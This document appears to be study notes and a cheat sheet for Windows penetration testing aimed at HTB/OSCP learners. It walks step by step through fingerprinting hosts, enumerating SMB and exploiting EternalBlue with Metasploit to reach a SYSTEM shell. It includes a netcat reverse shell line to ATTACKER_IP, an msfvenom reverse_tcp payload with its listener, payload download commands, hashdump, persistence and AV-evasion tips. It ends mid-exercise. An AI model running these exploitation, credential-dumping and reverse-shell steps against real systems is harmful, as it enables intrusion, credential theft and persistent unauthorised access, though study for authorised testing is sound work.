# 1️⃣ Why Windows Is a Major Target

Microsoft Windows dominates:

- Enterprise environments
    
- Corporate networks
    
- Active Directory infrastructures
    
- Cloud-connected environments
    

Over **3,688+ vulnerabilities** reported in recent years.

---

## 📊 Windows Attack Surface Overview

![Image](https://learn.microsoft.com/en-us/security-exposure-management/media/enterprise-exposure-map/attack-surface-exposure-map-sidepane.png)

![Image](https://www.dlt.com/sites/default/files/styles/content_image/public/blogfeaturedimages/2019-09/Acitve-Directory-Blog-Post_3_8_18.jpg?itok=XVREMdMo)

![Image](https://www.ibm.com/content/adobe-cms/us/en/think/x-force/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service/jcr%3Acontent/root/table_of_contents/body-article-8/image_148109949.coreimg.png/1763567349969/critically-close-to-zero-day-exploiting-microsoft-kernel-streaming-service-7.png)

![Image](https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2019_04/c-sec-widows-privilege-escalation-phase.png)

---

# 2️⃣ Prominent Windows Exploits

|Vulnerability|CVE/MS ID|Description|Impact|
|---|---|---|---|
|MS08-067|MS08-067|SMB vulnerability exploited by Conficker|Remote Code Execution|
|EternalBlue|MS17-010|SMBv1 exploit leaked from NSA|Remote Code Execution|
|PrintNightmare|CVE-2021-34527|Print Spooler vulnerability|SYSTEM access|
|BlueKeep|CVE-2019-0708|RDP vulnerability|Remote Code Execution|
|SigRed|CVE-2020-1350|DNS Server vulnerability|Domain Admin access|
|SeriousSam|CVE-2021-36934|SAM file permission flaw|Credential dumping|
|Zerologon|CVE-2020-1472|Netlogon authentication flaw|Domain takeover|

---

# 3️⃣ Windows Host Identification Methods

---

## Method 1: TTL Value Analysis

Command:

```bash
ping TARGET_IP
```

Example output:

```bash
ttl=128
```

|TTL Value|Likely OS|
|---|---|
|128|Windows|
|64|Linux|
|255|Network device|

---

## 📊 TTL Fingerprinting Example

![Image](https://www.ionos.com/digitalguide/fileadmin/_processed_/7/e/csm_ping-befehl-EN-5_3f397734ee.webp)

![Image](https://media.licdn.com/dms/image/v2/D4D12AQFdNqiJ3zltiw/article-cover_image-shrink_720_1280/B4DZqLu8w.H4AI-/0/1763280932381?e=2147483647&t=OgwD2yA_L5r9iI-UgXzuDO38c3qZcp5INA9ilUzZzVc&v=beta)

![Image](https://support.biamp.com/%40api/deki/files/861/ping_success.PNG?revision=2)

![Image](https://www.ionos.com/digitalguide/fileadmin/_processed_/b/4/csm_ping-befehl-EN-4_b8cf383025.webp)

---

## Method 2: Nmap OS Detection

Command:

```bash
sudo nmap -v -O TARGET_IP
```

Example result:

```bash
OS: Microsoft Windows 10
```

Key indicators:

|Indicator|Meaning|
|---|---|
|microsoft-ds|SMB running|
|msrpc|Windows RPC|
|netbios-ssn|Windows networking|

---

# 4️⃣ Banner Grabbing for Enumeration

Command:

```bash
sudo nmap TARGET_IP --script banner.nse
```

Result example:

```bash
VMware Authentication Daemon
```

This reveals:

- Running services
    
- Software versions
    
- Potential vulnerabilities
    

---

# 5️⃣ Common Windows Services

|Port|Service|Purpose|
|---|---|---|
|135|RPC|Remote Procedure Calls|
|139|NetBIOS|File sharing|
|445|SMB|File sharing|
|3389|RDP|Remote Desktop|
|80|IIS|Web server|

---

# 6️⃣ Windows Payload File Types

---

## DLL (Dynamic Link Library)

|Feature|Description|
|---|---|
|Extension|.dll|
|Purpose|Inject malicious code|
|Attack type|DLL hijacking|

Example use:

- Privilege escalation
    
- Persistence
    

---

## Batch Files

Extension:

```text
.bat
```

Example:

```batch
nc.exe ATTACKER_IP 4444 -e cmd.exe
```

---

## VBS Scripts

Extension:

```text
.vbs
```

Used for:

- Phishing attacks
    
- Script execution
    

---

## MSI Installer Payload

Extension:

```text
.msi
```

Execute payload:

```bash
msiexec /i payload.msi
```

---

## PowerShell Payload

Extension:

```text
.ps1
```

Example:

```powershell
powershell -nop -c reverse shell code
```

---

# 7️⃣ Payload Generation Tools

|Tool|Purpose|
|---|---|
|MSFvenom|Generate payloads|
|Metasploit|Exploitation framework|
|Nishang|PowerShell payloads|
|Mythic C2|Command and control|
|Darkarmour|Obfuscation|

---

# 8️⃣ Payload Transfer Methods

|Method|Tool|
|---|---|
|SMB|smbclient|
|HTTP|web server|
|FTP|ftp|
|Email|phishing|
|USB|physical access|
|Impacket|psexec, smbexec|

---

# 9️⃣ Compromise Workflow (Step-by-Step)

---

## Step 1: Enumeration

Command:

```bash
nmap -v -A TARGET_IP
```

Result:

```bash
OS: Windows Server 2016
```

---

## Step 2: Check Vulnerability

Metasploit module:

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

```bash
set RHOSTS TARGET_IP
```

```bash
run
```

Result:

```bash
Host is likely VULNERABLE
```

---

# 🔟 Exploit EternalBlue

Select exploit:

```bash
use exploit/windows/smb/ms17_010_psexec
```

Set options:

```bash
set RHOSTS TARGET_IP
```

```bash
set LHOST ATTACKER_IP
```

```bash
set LPORT 4444
```

Run exploit:

```bash
exploit
```

---

## 📊 EternalBlue Exploitation Flow

![Image](https://www.avast.com/hs-fs/hubfs/New_Avast_Academy/What%20is%20EternalBlue/EternalBlue-2.png?name=EternalBlue-2.png&width=660)

![Image](https://www.researchgate.net/publication/335456696/figure/fig1/AS%3A806675057504258%401569337729909/An-example-of-a-reverse-TCP-shell.jpg)

![Image](https://storage.googleapis.com/gweb-cloudblog-publish/images/vbscriptinstructions1.max-900x900.png)

![Image](https://www.avast.com/hs-fs/hubfs/New_Avast_Academy/What%20is%20EternalBlue/EternalBlue-1.png?name=EternalBlue-1.png&width=660)

---

# 1️⃣1️⃣ Meterpreter Session Obtained

Example:

```bash
meterpreter > getuid
```

Output:

```bash
NT AUTHORITY\SYSTEM
```

You now have SYSTEM access.

---

# 1️⃣2️⃣ Getting CMD Shell

Command:

```bash
meterpreter > shell
```

Output:

```bash
C:\Windows\system32>
```

---

# 1️⃣3️⃣ CMD vs PowerShell Comparison

|Feature|CMD|PowerShell|
|---|---|---|
|Type|Text-based|Object-based|
|Age|Older|Modern|
|Logging|Minimal|Extensive|
|Scripts|Batch|Advanced scripting|
|Stealth|Better|Less stealthy|
|Features|Limited|Advanced|

---

# 1️⃣4️⃣ CMD Usage Examples

```cmd
whoami
```

```cmd
ipconfig
```

```cmd
dir
```

---

# 1️⃣5️⃣ PowerShell Usage Examples

```powershell
Get-Process
```

```powershell
Get-Service
```

```powershell
Get-LocalUser
```

---

# 1️⃣6️⃣ Windows Exploitation Workflow Summary

```text
Scan → Identify Windows → Find vulnerability → Exploit → Deliver payload → Gain shell → Privilege escalation
```

---

# 1️⃣7️⃣ Windows Subsystem for Linux (WSL)

WSL allows Linux execution inside Windows.

Attackers use WSL to:

- Execute Linux payloads
    
- Bypass AV detection
    
- Evade firewall monitoring
    

---

## 📊 WSL Attack Concept

![Image](https://learn-attachment.microsoft.com/api/attachments/3ccacbef-1104-44e6-968d-b0d8d2c111b2?platform=QnA)

![Image](https://www.xenonstack.com/hubfs/penetration-testing-workflow-xenonstack.png)

![Image](https://learn.microsoft.com/en-us/windows/wsl/media/wsl-gui-screenshot.png)

![Image](https://code.visualstudio.com/assets/docs/remote/wsl/architecture-wsl.png)

---

# 1️⃣8️⃣ Important Enumeration Commands

|Command|Purpose|
|---|---|
|ping|Check TTL|
|nmap -O|Detect OS|
|nmap -A|Full scan|
|banner.nse|Banner grabbing|

---

# 1️⃣9️⃣ Important Exploitation Commands

|Command|Purpose|
|---|---|
|msfconsole|Start Metasploit|
|search eternal|Find exploit|
|use exploit|Select exploit|
|set options|Configure exploit|
|exploit|Run exploit|

---

# 2️⃣0️⃣ Final Attack Chain

```text
Recon → Fingerprint → Enumerate → Exploit → Payload Execution → Meterpreter → SYSTEM Shell
```

---
# 🪟 Windows Exploitation Cheat Sheet (HTB / OSCP / Pentest)

---

# 1️⃣ Windows Host Identification

## TTL Fingerprinting

|Command|Purpose|
|---|---|
|`ping TARGET_IP`|Identify OS via TTL|

|TTL|OS|
|---|---|
|128|Windows|
|64|Linux|
|255|Network device|

Example:

```bash
ping 192.168.1.10
```

---

## Nmap OS Detection

```bash
nmap -O -v TARGET_IP
```

```bash
nmap -A TARGET_IP
```

Look for:

```text
Microsoft Windows
microsoft-ds
msrpc
netbios-ssn
```

---

# 2️⃣ Important Windows Ports

|Port|Service|
|---|---|
|135|RPC|
|139|NetBIOS|
|445|SMB|
|3389|RDP|
|5985|WinRM|
|80|IIS|

---

# 3️⃣ SMB Enumeration

```bash
nmap -p445 --script smb-enum-shares TARGET_IP
```

```bash
smbclient -L TARGET_IP
```

```bash
enum4linux TARGET_IP
```

---

# 4️⃣ Banner Grabbing

```bash
nmap --script banner TARGET_IP
```

```bash
nc TARGET_IP 445
```

---

# 5️⃣ Vulnerability Scanning

Check EternalBlue:

```bash
use auxiliary/scanner/smb/smb_ms17_010
```

```bash
set RHOSTS TARGET_IP
run
```

---

# 6️⃣ EternalBlue Exploitation

```bash
use exploit/windows/smb/ms17_010_psexec
```

```bash
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
set LPORT 4444
exploit
```

---

# 7️⃣ Meterpreter Commands

|Command|Purpose|
|---|---|
|sysinfo|System info|
|getuid|Current user|
|shell|CMD shell|
|ls|List files|
|pwd|Current directory|
|upload file|Upload file|
|download file|Download file|

---

# 8️⃣ Get CMD Shell

```bash
meterpreter > shell
```

CMD prompt:

```cmd
C:\Windows\system32>
```

---

# 9️⃣ CMD Enumeration

```cmd
whoami
```

```cmd
hostname
```

```cmd
ipconfig
```

```cmd
systeminfo
```

```cmd
net users
```

```cmd
net localgroup administrators
```

---

# 🔟 PowerShell Enumeration

Start PowerShell:

```cmd
powershell
```

Commands:

```powershell
whoami
```

```powershell
Get-Process
```

```powershell
Get-Service
```

```powershell
Get-LocalUser
```

```powershell
Get-NetIPConfiguration
```

---

# 1️⃣1️⃣ Payload Creation (MSFvenom)

## Windows Payload

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > shell.exe
```

## Listener

```bash
use exploit/multi/handler
```

```bash
set payload windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
exploit
```

---

# 1️⃣2️⃣ File Transfer

## Python HTTP Server

```bash
python3 -m http.server 8000
```

Download on Windows:

```powershell
wget http://ATTACKER_IP:8000/shell.exe -OutFile shell.exe
```

---

## SMB Transfer

```bash
impacket-smbserver share .
```

Windows:

```cmd
copy \\ATTACKER_IP\share\shell.exe shell.exe
```

---

# 1️⃣3️⃣ Privilege Escalation

Meterpreter:

```bash
getsystem
```

```bash
hashdump
```

Manual:

```cmd
whoami /priv
```

```cmd
net localgroup administrators
```

---

# 1️⃣4️⃣ Persistence

Meterpreter:

```bash
run persistence
```

---

# 1️⃣5️⃣ Identify Shell Type

|Prompt|Shell|
|---|---|
|C:\Windows\system32>|CMD|
|PS C:\Windows\system32>|PowerShell|
|meterpreter >|Meterpreter|

---

# 1️⃣6️⃣ Common Windows Payload Types

|Type|Extension|
|---|---|
|Executable|.exe|
|DLL|.dll|
|Batch|.bat|
|PowerShell|.ps1|
|Installer|.msi|

---

# 1️⃣7️⃣ Quick Exploitation Workflow

```bash
nmap -A TARGET_IP
```

```bash
msfconsole
```

```bash
search eternalblue
```

```bash
use exploit/windows/smb/ms17_010_psexec
```

```bash
set RHOSTS TARGET_IP
set LHOST ATTACKER_IP
exploit
```

```bash
meterpreter > shell
```

---

# 1️⃣8️⃣ Most Important Commands (Exam Quick Use)

|Task|Command|
|---|---|
|Scan target|nmap -A TARGET_IP|
|Start Metasploit|msfconsole|
|Check vulnerability|smb_ms17_010|
|Exploit target|exploit/windows/smb/ms17_010_psexec|
|Create payload|msfvenom|
|Get shell|meterpreter > shell|
|Priv esc|getsystem|

---

# 1️⃣9️⃣ Windows Post-Exploitation Basics

```cmd
whoami
```

```cmd
systeminfo
```

```cmd
ipconfig
```

```cmd
netstat -ano
```

```cmd
tasklist
```

---

# 2️⃣0️⃣ Full Attack Chain

```text
Recon → Scan → Identify Windows → Enumerate SMB → Exploit → Payload → Meterpreter → SYSTEM Shell
```

---

### Exercises

![[Pasted image 20260216104505.png]]

Steps for the solution.

Step1. 